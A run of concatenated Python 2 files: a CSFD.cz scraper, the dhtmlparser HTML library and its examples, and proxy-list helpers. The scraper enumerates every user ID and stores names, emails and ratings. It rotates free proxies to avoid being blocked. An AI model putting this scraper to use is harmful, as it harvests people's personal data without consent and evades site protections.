def writeln(s, out=sys.stdout):
	write(s + "\n")



def _grabProxyList(max_ping = 4000):
	proxy_list = filter(
		lambda x:
			x["ping"] <= max_ping,
		# ipaddresscom.getProxies()
		hidemyass.getProxies()
	)
	proxy_list.sort(
		key = lambda x: x["ping"]
	)

	return proxy_list


def _downloadWithProxy(url, debug = True):
	global proxy_list
	if proxy_list == []:
		print "Downloading proxy list.."
		try:
			proxy_list = _grabProxyList()
		except:
			raise EnvironmentError("httpproxy module stopped working.")

	# rotate proxy
	proxy_list = proxy_list[1:] + [proxy_list[0]]

	# pick first proxy on stack
	proxy = proxy_list[0]["ip"] + ":" + str(proxy_list[0]["port"])

	# Downloader instance
	down = httpkie.Downloader(http_proxy = proxy)

	# try proxy, skip if returns unreasonable 404
	try:
		down.download("http://csfd.cz")
	except:
		del proxy_list[0]
		return _downloadWithProxy(url)

	# download data, drop proxy servers which timeouts/return crap/whatever
	try:
		data = down.download(url)
	except urllib2.URLError, e:
		if "HTTP Error 404" in str(e):
			raise

		if debug:
			print "\t\t// " + str(e)
			print "\t\t   -> discarding proxy", proxy
		del proxy_list[0]
		return _downloadWithProxy(url)
	except httplib.BadStatusLine:
		if debug:
			print "\t\t// bad statusline; discarding proxy", proxy
		del proxy_list[0]
		return _downloadWithProxy(url)
	except socket.error, e:
		if debug:
			print "\t\t// " + str(e)
			print "\t\t   -> discarding proxy", proxy
		del proxy_list[0]
		return _downloadWithProxy(url)
	except httplib.IncompleteRead, e:
		if debug:
			print "\t\t// incomplete read; discarding proxy", proxy
		del proxy_list[0]
		return _downloadWithProxy(url)


	# check if proxy server returned desired content - some servers works only
	# for few requests and start returning ads after some time
	dom = dhtmlparser.parseString(data)
	title = dom.find("title")
	if len(title) == 0 or "SFD.cz" not in title[0].getContent() or "POMO Media Group s.r.o." not in data:
		if debug:
			print "\t\t// returned shit; discarding proxy", proxy
		del proxy_list[0]
		return _downloadWithProxy(url)

	return data


def useProxy():
	global _download
	csfd._download = _downloadWithProxy


def urlToID(url):
	num = filter(
		lambda x:
			x.isdigit(),
		url.replace("/", "-").split("-")
	)[0]

	return int(num)


def main(args, db):
	for uid in xrange(args._from, args.to + 1):
		if db.csfd.users.find_one({"_id": uid}) is not None:
			print "\t%d - already parsed, skipping" % (uid)
			continue
		if db.csfd.notfound.find_one({"_id": uid}) is not None:
			print "\t%d - not found, skipping" % (uid)
			continue


		u = csfd.User(uid)

		try:
			u.parseData()
		except urllib2.HTTPError:
			db.csfd.notfound.insert({"_id": uid})
			print "\t%d - not found, skipping" % (uid)
			continue


		print "\t%d - %s (%d movies)" % (uid, u.username, len(u.ratings))


		user = {
			"_id": u.uid,
			"username": u.username,
			"realname": u.realname,
			"email": u.email,
			"updated": 0
		}

		ratings = []
		for rating_dict in u.ratings:
			movie_id = urlToID(rating_dict["url"])

			db.csfd.movies.update(
				{"_id": movie_id},
				{
					"_id": movie_id,
					"url": rating_dict["url"],
					"name": rating_dict["name"].decode("utf-8").strip()
				},
				upsert = True
			)

			ratings.append(
				{
					"movie_id": movie_id,
					"rating": rating_dict["rating"],
				}
			)


		user["ratings"] = ratings
		user["updated"] = u.updated
		db.csfd.users.insert(user)


def installProxy(args):
	# install proxy
	if args.proxy != "":
		if ":" not in args.proxy:
			writeln("You have to specify port in proxy settings!", sys.stderr)
			sys.exit(1)

		__ = args.proxy.split(":")
		port = 0
		hostname = ""
		try:
			hostname = __[0]
			port = int(__[1])
		except Exception, e:
			writeln(str(e), sys.stderr)
			sys.exit(1)

		IPtools.installProxy(hostname, port)



#= Main program ===============================================================
if __name__ == '__main__':
	# Parse arguments
	parser = argparse.ArgumentParser(
		description = """
			CSFD data downloader.
			This script just downloads some of user data and save into mongodb.
		"""
	)

	# Required arguments
	parser.add_argument(
		"-f",
		"--from",
		action  = "store",
		metavar = "UID",
		dest    ='_from',
		default = 1,
		type    = int,
		help    = "Set FROM which UID will script try to download data. Default 1."
	)
	parser.add_argument(
		"-t",
		"--to",
		action  = "store",
		metavar = "UID",
		default = 0,
		type    = int,
		help    = "Set TO which UID will script try to download data. Default max(UID)."
	)
	parser.add_argument(
		"-u",
		"--use-proxy",
		action  = "store_true",
		default = False,
		help    = "Use proxylist downloaded automatically from 'hidemyass.com'."
	)
	parser.add_argument(
		"-p",
		"--proxy",
		action  = "store",
		metavar = "PROXY:PORT",
		default = "",
		help    = "Use SOCK5 proxy."
	)

	# Positional
	parser.add_argument(
		"filename",
		nargs='?',
		default = "csfd.cz.sqlite",
		help = "SQLite filename. Default 'csfd.cz.sqlite'."
	)

	args = parser.parse_args()

	# sock5 proxy support
	installProxy(args)

	# http proxy support
	if args.use_proxy:
		writeln("Using proxylist.")
		useProxy()

	if args.to == 0:
		write("Looking for last UID .. ")
		args.to = csfd.findNumberOfUsers()
		writeln(str(args.to))

	# database handling
	client = MongoClient('localhost', 27017)

	main(args, client)
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from dhtmlparser import *#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Author:  Bystroushaak (bystrousak@kitakitsune.org)
Version: 1.7.3

This version doens't corresponds with DHTMLParser v1.5.0 - there were updates,
which makes both parsers incompatible.

This work is licensed under a Creative Commons 3.0 Unported License
(http://creativecommons.org/licenses/by/3.0/cz/).

Project page; https://github.com/Bystroushaak/pyDHTMLParser
"""



# Nonpair tags
NONPAIR_TAGS = [
	"br",
	"hr",
	"img",
	"input",
	#"link",
	"meta",
	"spacer",
	"frame",
	"base"
]



def unescape(inp, quote = '"'):
	if len(inp) < 2:
		return inp

	output = ""
	unesc = False
	for act in inp:
		if act == quote and unesc:
			output = output[:-1]

		output += act

		if act == "\\":
			unesc = not unesc
		else:
			unesc = False

	return output


def escape(input, quote = '"'):
	output = ""

	for c in input:
		if c == quote:
			output += '\\'

		output += c

	return output


def rotate_buff(buff):
	"Rotate buffer (for each buff[i] = buff[i-1])"
	i = len(buff) - 1
	while i > 0:
		buff[i] = buff[i - 1]
		i -= 1

	return buff


class SpecialDict(dict):
	"""
	This dictionary stores items case sensitive, but compare them case
	INsensitive.
	"""
	def __contains__(self, k):
		for item in super(SpecialDict, self).keys():
			if k.lower() == item.lower():
				return True

	def __getitem__(self, k):
		for item in self.keys():
			if k.lower() == item.lower():
				return super(SpecialDict, self).__getitem__(item)



class HTMLElement():
	"""
	Container for parsed html elements.
	"""

	def __init__(self, tag = "", second = None, third = None):
		self.__element = None
		self.__tagname = ""

		self.__istag        = False
		self.__isendtag     = False
		self.__iscomment    = False
		self.__isnonpairtag = False

		self.childs = []
		self.params = SpecialDict()
		self.endtag = None
		self.openertag = None

		# blah, constructor overloading in python sux :P
		if isinstance(tag, str) and second is None and third is None:
			self.__init_tag(tag)
		elif isinstance(tag, str) and isinstance(second, dict) and third is None:
			self.__init_tag_params(tag, second)
		elif isinstance(tag, str) and isinstance(second, dict) and     \
		     (isinstance(third, list) or isinstance(third, tuple)) and \
		     len(third) > 0 and isinstance(third[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"
			self.__init_tag_params(tag, second)
			self.childs = closeElements(third)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif isinstance(tag, str) and (isinstance(second, list) or \
			 isinstance(second, tuple)) and len(second) > 0 and    \
			 isinstance(second[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"

			self.__init_tag(tag)
			self.childs = closeElements(second)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif (isinstance(tag, list) or isinstance(tag, tuple)) and len(tag) > 0 \
		     and isinstance(tag[0], HTMLElement):
			self.__init_tag("")
			self.childs = closeElements(tag)
		else:
			raise Exception("Oh no, not this crap!")


	#===========================================================================
	#= Constructor overloading =================================================
	#===========================================================================
	def __init_tag(self, tag):
			self.__element = tag

			self.__parseIsTag()
			self.__parseIsComment()

			if (not self.__istag) or self.__iscomment:
				self.__tagname = self.__element
			else:
				self.__parseTagName()

			if self.__iscomment or not self.__istag:
				return

			self.__parseIsEndTag()
			self.__parseIsNonPairTag()

			if self.__istag and (not self.__isendtag) or "=" in self.__element:
				self.__parseParams()


	# used when HTMLElement(tag, params) is called - basically create string
	# from tagname and params
	def __init_tag_params(self, tag, params):
		tag = tag.strip().replace(" ", "")
		nonpair = ""

		if tag.startswith("<"):
			tag = tag[1:]

		if tag.endswith("/>"):
			tag = tag[:-2]
			nonpair = " /"
		elif tag.endswith(">"):
			tag = tag[:-1]

		output = "<" + tag

		for key in params.keys():
			output += " " + key + '="' + escape(params[key], '"') + '"'

		self.__init_tag(output + nonpair + ">")


	def find(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAll, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAll(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAllB, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAllB(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findAll(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Depth-first algorithm
		http://en.wikipedia.org/wiki/Depth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		tmp = []
		for el in self.childs:
			tmp = el.findAll(tag_name, params, fn, case_sensitive)

			if tmp is not None and len(tmp) > 0:
				output.extend(tmp)

		return output


	def findAllB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Breadth-first algorithm
		http://en.wikipedia.org/wiki/Breadth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		breadth_search = self.childs
		for el in breadth_search:
			if el.isAlmostEqual(tag_name, params, fn, case_sensitive):
				output.append(el)

			if len(el.childs) > 0:
				breadth_search.extend(el.childs)

		return output


	#==========================================================================
	#= Parsers ================================================================
	#==========================================================================
	def __parseIsTag(self):
		if self.__element.startswith("<") and self.__element.endswith(">"):
			self.__istag = True
		else:
			self.__istag = False


	def __parseIsEndTag(self):
		last = ""
		self.__isendtag = False

		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == "/" and last == "<":
					self.__isendtag = True
				if ord(c) > 32:
					last = c


	def __parseIsNonPairTag(self):
		last = ""
		self.__isnonpairtag = False

		# Tags endings with /> are nonpair - do not mind whitespaces (< 32)
		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == ">" and last == "/":
					self.__isnonpairtag = True
					return
				if ord(c) > 32:
					last = c

		# Check listed nonpair tags
		if self.__tagname.lower() in NONPAIR_TAGS:
			self.__isnonpairtag = True


	def __parseIsComment(self):
		if self.__element.startswith("<!--") and self.__element.endswith("-->"):
			self.__iscomment = True
		else:
			self.__iscomment = False


	def __parseTagName(self):
		for el in self.__element.split(" "):
			el = el.replace("/", "").replace("<", "").replace(">", "")
			if len(el) > 0:
				self.__tagname = el.rstrip()
				return


	def __parseParams(self):
		# check if there are any parameters
		if " " not in self.__element or "=" not in self.__element:
			return

		# Remove '<' & '>'
		params = self.__element.strip()[1:-1].strip()
		# Remove tagname
		params = params[
			params.find(self.getTagName()) + len(self.getTagName()):
		].strip()

		# Parser machine
		next_state = 0
		key = ""
		value = ""
		end_quote = ""
		buff = ["", ""]
		for c in params:
			if next_state == 0:  # key
				if c.strip() != "":  # safer than list space, tab and all possible whitespaces in UTF
					if c == "=":
						next_state = 1
					else:
						key += c
			elif next_state == 1:  # value decisioner
				if c.strip() != "":  # skip whitespaces
					if c == "'" or c == '"':
						next_state = 3
						end_quote = c
					else:
						next_state = 2
						value += c
			elif next_state == 2:  # one word parameter without quotes
				if c.strip() == "":
					next_state = 0
					self.params[key] = value
					key = ""
					value = ""
				else:
					value += c
			elif next_state == 3:  # quoted string
				if c == end_quote and (buff[0] != "\\" or (buff[0]) == "\\" and buff[1] == "\\"):
					next_state = 0
					self.params[key] = unescape(value, end_quote)
					key = ""
					value = ""
					end_quote = ""
				else:
					value += c

			buff = rotate_buff(buff)
			buff[0] = c

		if key != "":
			if end_quote != "" and value.strip() != "":
				self.params[key] = unescape(value, end_quote)
			else:
				self.params[key] = value

		if len(filter(lambda x: x == "/", self.params.keys())) > 0:
			del self.params["/"]
			self.__isnonpairtag = True

	#* /Parsers ****************************************************************


	#===========================================================================
	#= Getters =================================================================
	#===========================================================================
	def isTag(self):
		"True if element is tag (not content)."
		return self.__istag


	def isEndTag(self):
		"True if HTMLElement is end tag (/tag)."
		return self.__isendtag


	def isNonPairTag(self, isnonpair = None):
		"""
		Returns True if HTMLElement is listed nonpair tag table (br for example)
		or if it ends with / - <br /> for example.

		You can also change state from pair to nonpair if you use this as setter.
		"""
		if isnonpair is None:
			return self.__isnonpairtag
		else:
			self.__isnonpairtag = isnonpair
			if not isnonpair:
				self.endtag = None
				self.childs = []


	def isPairTag(self):
		"""
		Return True if this is paired tag - <body> .. </body> for example.
		"""
		if self.isComment() or self.isNonPairTag:
			return False
		if self.isEndTag():
			return True
		if self.isOpeningTag() and self.endtag is not None:
			return True

		return False


	def isComment(self):
		"True if HTMLElement is html comment."
		return self.__iscomment


	def isOpeningTag(self):
		"True if is opening tag."
		if self.isTag() and (not self.isComment()) and (not self.isEndTag()) \
		   and (not self.isNonPairTag()):
			return True
		else:
			return False


	def isEndTagTo(self, opener):
		"Returns true, if this element is endtag to opener."
		if self.__isendtag and opener.isOpeningTag():
			if self.__tagname.lower() == opener.getTagName().lower():
				return True
			else:
				return False
		else:
			return False


	def tagToString(self):
		"Returns tag (with parameters), without content or endtag."
		if len(self.params) <= 0:
			return self.__element
		else:
			output = "<" + str(self.__tagname)

			for key in self.params.keys():
				output += " " + key + "=\"" + escape(self.params[key], '"') + "\""

			return output + " />" if self.__isnonpairtag else output + ">"


	def getTagName(self):
		"Returns tag name."
		return self.__tagname


	def getContent(self):
		"Returns content of tag (everything between opener and endtag)."
		output = ""

		for c in self.childs:
			if not c.isEndTag():
				output += c.toString()

		if output.endswith("\n"):
			output = output[:-1]

		return output


	def prettify(self, depth = 0, separator = "  ", last = True, pre = False, inline = False):
		"Returns prettifyied tag with content."
		output = ""

		if self.getTagName() != "" and self.tagToString().strip() == "":
			return ""

		# if not inside <pre> and not inline, shift tag to the right
		if not pre and not inline:
			output += (depth * separator)

		# for <pre> set 'pre' flag
		if self.getTagName().lower() == "pre" and self.isOpeningTag():
			pre = True
			separator = ""

		output += self.tagToString()

		# detect if inline
		is_inline = inline  # is_inline shows if inline was set by detection, or as parameter
		for c in self.childs:
			if not (c.isTag() or c.isComment()):
				if len(c.tagToString().strip()) != 0:
					inline = True

		# don't shift if inside container (containers have blank tagname)
		original_depth = depth
		if self.getTagName() != "":
			if not pre and not inline:  # inside <pre> doesn't shift tags
				depth += 1
				if self.tagToString().strip() != "":
					output += "\n"

		# prettify childs
		for e in self.childs:
			if not e.isEndTag():
				output += e.prettify(depth, last = False, pre = pre, inline = inline)

		# endtag
		if self.endtag is not None:
			if not pre and not inline:
				output += ((original_depth) * separator)

			output += self.endtag.tagToString().strip()

			if not is_inline:
				output += "\n"

		return output

	#* /Getters ****************************************************************


	#===========================================================================
	#= Operators ===============================================================
	#===========================================================================
	def toString(self, original = False):
		"""
		Returns almost original string (use original = True if you want exact copy).

		If you want prettified string, try .prettify()

		If original == True, return parsed element, so if you changed something
		in .params, there will be no traces of those changes.
		"""
		output = ""

		if self.childs != [] or self.isOpeningTag():
			output += self.__element if original else self.tagToString()

			for c in self.childs:
				output += c.toString(original)

			if self.endtag is not None:
				output += self.endtag.tagToString()
		elif not self.isEndTag():
			output += self.tagToString()

		return output


	def __str__(self):
		return self.toString()


	def isAlmostEqual(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Compare element with given tagname, params and/or by lambda function.

		Lambda function is same as in .find().
		"""

		if isinstance(tag_name, HTMLElement):
			return self.isAlmostEqual(tag_name.getTagName(), self.params)

		# search by lambda function
		if fn is not None:
			if fn(self):
				return True

		if not case_sensitive:
			self.__tagname = self.__tagname.lower()
			tag_name = tag_name.lower()

		# compare tagname
		if self.__tagname == tag_name and self.__tagname != "" and self.__tagname is not None:
			# compare parameters
			if params is None or len(params) == 0:
				return True
			elif len(self.params) > 0:
				for key in params.keys():
					if key not in self.params:
						return False
					elif params[key] != self.params[key]:
						return False

				return True

		return False

	#* /Operators **************************************************************


	#===========================================================================
	#= Setters =================================================================
	#===========================================================================
	def replaceWith(self, el):
		"""
		Replace element. Useful when you don't want change all references to object.
		"""
		self.childs = el.childs
		self.params = el.params
		self.endtag = el.endtag
		self.openertag = el.openertag

		self.__tagname = el.getTagName()
		self.__element = el.tagToString()

		self.__istag = el.isTag()
		self.__isendtag = el.isEndTag()
		self.__iscomment = el.isComment()
		self.__isnonpairtag = el.isNonPairTag()


	def removeChild(self, child, end_tag_too = True):
		"""
		Remove subelement (child) specified by reference.

		This can't be used for removing subelements by value! If you want do
		such thing, do:

		---
		for e in dom.find("value"):
			dom.removeChild(e)
		---

		Params:
			child
				child which will be removed from dom (compared by reference)
			end_tag_too
				remove end tag too - default true
		"""

		if len(self.childs) <= 0:
			return

		end_tag = None
		if end_tag_too:
			end_tag = child.endtag

		for e in self.childs:
			if e == child:
				self.childs.remove(e)
			if end_tag_too and end_tag == e and end_tag is not None:
				self.childs.remove(e)
			else:
				e.removeChild(child, end_tag_too)

	#* /Setters ****************************************************************



def closeElements(childs):
	"Close tags - used in some constructors"

	o = []

	# Close all unclosed pair tags
	for e in childs:
		if e.isTag():
			if not e.isNonPairTag() and not e.isEndTag() and not e.isComment() and e.endtag is None:
				e.childs = closeElements(e.childs)

				o.append(e)
				o.append(HTMLElement("</" + e.getTagName() + ">"))

				# Join opener and endtag
				e.endtag = o[-1]
				o[-1].openertag = e
			else:
				o.append(e)
		else:
			o.append(e)

	return o



def __raw_split(itxt):
	"""
	Parse HTML from text into array filled with tags end text.

	Source code is little bit unintutive, because it is simple parser machine.
	For better understanding, look at;
	http://kitakitsune.org/images/field_parser.png
	"""
	echr = ""
	buff = ["", "", "", ""]
	content = ""
	array = []
	next_state = 0
	inside_tag = False

	for c in itxt:
		if next_state == 0:  # content
			if c == "<":
				if len(content) > 0:
					array.append(content)
				content = c
				next_state = 1
				inside_tag = False
			else:
				content += c
		elif next_state == 1:  # html tag
			if c == ">":
				array.append(content + c)
				content = ""
				next_state = 0
			elif c == "'" or c == '"':
				echr = c
				content += c
				next_state = 2
			elif c == "-" and buff[0] == "-" and buff[1] == "!" and buff[2] == "<":
				if len(content[:-3]) > 0:
					array.append(content[:-3])
				content = content[-3:] + c
				next_state = 3
			else:
				if c == "<":  # jump back into tag instead of content
					inside_tag = True
				content += c
		elif next_state == 2:  # "" / ''
			if c == echr and (buff[0] != "\\" or (buff[0] == "\\" and buff[1] == "\\")):
				next_state = 1
			content += c
		elif next_state == 3:  # html comments
			if c == ">" and buff[0] == "-" and buff[1] == "-":
				if inside_tag:
					next_state = 1
				else:
					next_state = 0
				inside_tag = False

				array.append(content + c)
				content = ""
			else:
				content += c

		# rotate buffer
		buff = rotate_buff(buff)
		buff[0] = c

	if len(content) > 0:
		array.append(content)

	return array



def __repair_tags(raw_input):
	"""
	Repair tags with comments (<HT<!-- asad -->ML> is parsed to
	["<HT", "<!-- asad -->", "ML>"]	and I need ["<HTML>", "<!-- asad -->"])
	"""
	ostack = []

	index = 0
	while index < len(raw_input):
		el = raw_input[index]

		if el.isComment():
			if index > 0 and index < len(raw_input) - 1:
				if raw_input[index - 1].tagToString().startswith("<") and raw_input[index + 1].tagToString().endswith(">"):
					ostack[-1] = HTMLElement(ostack[-1].tagToString() + raw_input[index + 1].tagToString())
					ostack.append(el)
					index += 1
					continue

		ostack.append(el)

		index += 1

	return ostack



def __indexOfEndTag(istack):
	"""
	Go through istack and search endtag. Element at first index is considered as
	opening tag.

	Returns: index of end tag or 0 if not found.
	"""
	if len(istack) <= 0:
		return 0

	if not istack[0].isOpeningTag():
		return 0

	opener = istack[0]
	cnt = 0

	index = 0
	for el in istack[1:]:
		if el.isOpeningTag() and (el.getTagName().lower() == opener.getTagName().lower()):
			cnt += 1
		elif el.isEndTagTo(opener):
			if cnt == 0:
				return index + 1
			else:
				cnt -= 1

		index += 1

	return 0



def __parseDOM(istack):
	"Recursively go through element array and create DOM."
	ostack = []
	end_tag_index = 0

	index = 0
	while index < len(istack):
		el = istack[index]

		end_tag_index = __indexOfEndTag(istack[index:])  # Check if this is pair tag

		if not el.isNonPairTag() and end_tag_index == 0 and not el.isEndTag():
			el.isNonPairTag(True)

		if end_tag_index != 0:
			el.childs = __parseDOM(istack[index + 1: end_tag_index + index])
			el.endtag = istack[end_tag_index + index]  # Reference to endtag
			el.endtag.openertag = el
			ostack.append(el)
			ostack.append(el.endtag)
			index = end_tag_index + index
		else:
			if not el.isEndTag():
				ostack.append(el)

		index += 1

	return ostack



def parseString(txt):
	"""
	Parse given string and return DOM tree consisting of single linked
	HTMLElements.
	"""
	istack = []

	# remove UTF BOM (prettify fails if not)
	if len(txt) > 3 and txt.startswith("\xef\xbb\xbf"):
		txt = txt[3:]

	for el in __raw_split(txt):
		istack.append(HTMLElement(el))

	container = HTMLElement()
	container.childs = __parseDOM(__repair_tags(istack))

	return container



def makeDoubleLinked(dom, parent = None):
	"""
	Standard output from dhtmlparser is single-linked tree. This will make it 
	double-linked.
	"""
	dom.parent = parent

	if len(dom.childs) > 0:
		for child in dom.childs:
			child.parent = dom
			makeDoubleLinked(child, dom)



#==============================================================================
#= Main program ===============================================================
#==============================================================================
if __name__ == "__main__":
	print "Testing.."

	assert unescape(r"""\' \\ \" \n""")      == r"""\' \\ " \n"""
	assert unescape(r"""\' \\ \" \n""", "'") == r"""' \\ \" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""printf(\"hello \t world\");""") == r"""printf("hello \t world");"""

	assert escape(r"""printf("hello world");""") == r"""printf(\"hello world\");"""
	assert escape(r"""'""", "'") == r"""\'"""

	dom = parseString("""
		"<div Id='xe' a='b'>obsah xe divu</div> <!-- Id, not id :) -->
		 <div id='xu' a='b'>obsah xu divu</div>
	""")

	# find test
	divXe = dom.find("div", {"id":"xe"})[0]
	divXu = dom.find("div", {"id":"xu"})[0]

	# assert divXe.tagToString() == """<div a="b" id="xe">"""
	# assert divXu.tagToString() == """<div a="b" id="xu">"""

	# unit test for toString
	assert divXe.toString() == """<div a="b" Id="xe">obsah xe divu</div>"""
	assert divXu.toString() == """<div a="b" id="xu">obsah xu divu</div>"""

	# getTagName() test
	assert divXe.getTagName() == "div"
	assert divXu.getTagName() == "div"

	# isComment() test
	assert divXe.isComment() == False
	assert divXe.isComment() == divXu.isComment()

	assert divXe.isNonPairTag() != divXe.isOpeningTag()

	assert divXe.isTag() is True
	assert divXe.isTag() == divXu.isTag()

	assert divXe.getContent() == "obsah xe divu"

	# find()/findB() test
	dom = parseString("""
		<div id=first>
			First div.
			<div id=first.subdiv>
				Subdiv in first div.
			</div>
		</div>
		<div id=second>
			Second.
		</div>
	""")

	assert dom.find("div")[1].getContent().strip() == "Subdiv in first div."
	assert dom.findB("div")[1].getContent().strip() == "Second."

	print "Everything ok."
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import dhtmlparser as d

s = """
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>
"""

dom = d.parseString(s)

print dom
print "---\nRemove all <object1>:\n---\n"

# remove all <object1>
for e in dom.find("object1"):
	dom.removeChild(e)


print dom.prettify()


#* Prints: *********************************************************************
"""
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>

---
Remove all <object1>:
---

<root>
  <object2>Second objects content</object2>
</root>
"""
#*******************************************************************************#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

# if inside container (or other tag), create endtag automatically
print HTMLElement([
	HTMLElement("<xe>")
])
"""
Writes:

<xe>
</xe>
"""

#-------------------------------------------------------------------------------

# if not inside container, elements are left unclosed 
print HTMLElement("<xe>")
"""
Writes only:

<xe>
"""#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
DHTMLParserPy example how to find every link in document.
"""

import urllib
import dhtmlparser

f = urllib.urlopen("http://google.com")
data = f.read()
f.close()

dom = dhtmlparser.parseString(data)

for link in dom.find("a"):
	if "href" in link.params:
		print link.params["href"]#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

foo = HTMLElement("<xe one='param'>")
baz = HTMLElement('<xe one="param">')

assert foo != baz # references are not the same
assert foo.isAlmostEqual(baz)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# DHTMLParser DOM creation example.
from dhtmlparser import *

e = HTMLElement("root", [
		HTMLElement("item", {"param1":"1", "param2":"2"}, [
			HTMLElement("<crap>", [
				HTMLElement("hello parser!")
			]),
			HTMLElement("<another_crap/>", {"with" : "params"}),
			HTMLElement("<!-- comment -->")
		]),
		HTMLElement("<item />", {"blank" : "body"})
	])

print e.prettify()

"""
Writes:

<root>
  <item param2="2" param1="1">
    <crap>hello parser!</crap>
    <another_crap with="params" />
    <!-- comment -->
  </item>
  <item blank="body" />
</root>
"""
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import json
import os.path
import argparse


# Variables ===================================================================
SUFFIX = ".minimized"


# Functions & objects =========================================================
def _minimized(line):
    data = json.loads(line)

    ratings = data["ratings"]
    minimized_ratings = map(
        lambda x: [x["rating"], x["movie_id"]],
        ratings
    )
    data["ratings"] = minimized_ratings

    return json.dumps(data) + "\n"


def minimize_users(in_file_iter, out_file):
    for cnt, line in enumerate(in_file_iter):
        out_file.write(_minimized(line))

        if cnt % 1000 == 0:
            out_file.flush()
            print cnt


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="Minimize user data from csfd dump to more compact size."
    )
    parser.add_argument(
        "-f",
        "--filename",
        required=True,
        metavar="FILE",
        help="Input filename."
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Output file. Default same as input filename with \"%s\" suffix." % SUFFIX
    )
    args = parser.parse_args()

    args.output = args.output if args.output else args.filename + SUFFIX

    if not os.path.exists(args.filename):
        sys.stderr.write("Can't open '%s'!\n" % args.filename)
        sys.exit(1)

    minimize_users(
        open(args.filename),
        open(args.output, "w")
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Functions & objects ========================================================


def binarySearch(low, high, test_fn):
	if test_fn(high):
		return high

	center = int((low + high) / 2)

	if test_fn(center):
		return binarySearch(center + 1, high, test_fn)
	else:
		return binarySearch(low, center - 1, test_fn)


#= Main program ===============================================================
if __name__ == '__main__':
	assert(binarySearch(0, 100, lambda x: x <= 20) == 20)
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

import incloak
import hidemyass
import ipaddresscom
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://incloak.com/proxy-list/.

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser as d



#= Functions & objects ========================================================
def getProxies():
	"""
	Return array of dicts following this structure:
	{
		ip: str(ip),
		port: int(port),
		ping: int(ms)
	}
	"""
	down = httpkie.Downloader()

	dom = d.parseString(
		down.download("http://incloak.com/proxy-list/?type=h&anon=234")
	)

	proxies = []
	for tr in dom.find("table")[6].find("tr")[1:]:
		proxy = {
			"ip": tr.find("td")[0].getContent(),
			"port": 8080,
			"ping": int(tr.find("div")[-1].getContent().split()[0])
		}
		proxies.append(proxy)

	return proxies


if __name__ == '__main__':
	import json
	print json.dumps(getProxies())
	print len(getProxies())
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from dhtmlparser import *#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Author:  Bystroushaak (bystrousak@kitakitsune.org)
Version: 1.7.3

This version doens't corresponds with DHTMLParser v1.5.0 - there were updates,
which makes both parsers incompatible.

This work is licensed under a Creative Commons 3.0 Unported License
(http://creativecommons.org/licenses/by/3.0/cz/).

Project page; https://github.com/Bystroushaak/pyDHTMLParser
"""



# Nonpair tags
NONPAIR_TAGS = [
	"br",
	"hr",
	"img",
	"input",
	#"link",
	"meta",
	"spacer",
	"frame",
	"base"
]



def unescape(inp, quote = '"'):
	if len(inp) < 2:
		return inp

	output = ""
	unesc = False
	for act in inp:
